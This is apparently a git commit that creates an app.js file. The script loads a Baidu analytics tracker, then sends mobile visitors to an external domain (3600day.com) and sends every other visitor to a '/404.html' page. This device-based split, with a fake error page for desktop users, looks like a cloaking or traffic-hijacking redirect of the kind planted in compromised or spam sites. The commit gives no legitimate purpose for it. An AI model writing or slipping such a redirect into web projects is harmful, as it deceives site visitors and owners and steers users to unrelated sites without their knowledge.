12ec10e1762744075bdd1226fa36396a38738e8b
kytgzero <130443591+kytgzero@users.noreply.github.com>
2023-04-12 01:16:42 +0800

    Create app.js

---
+++ app.js
@@ -0,0 +1,13 @@
+var _hmt = _hmt || [];
+(function () {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?3820b790f5fece8caa79d04012e9c508";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
+	var arr = ["http://www.3600day.com"];
+	window.location.href = arr[parseInt(Math.random() * arr.length)];
+}else{
+	window.location.href="/404.html";
+}
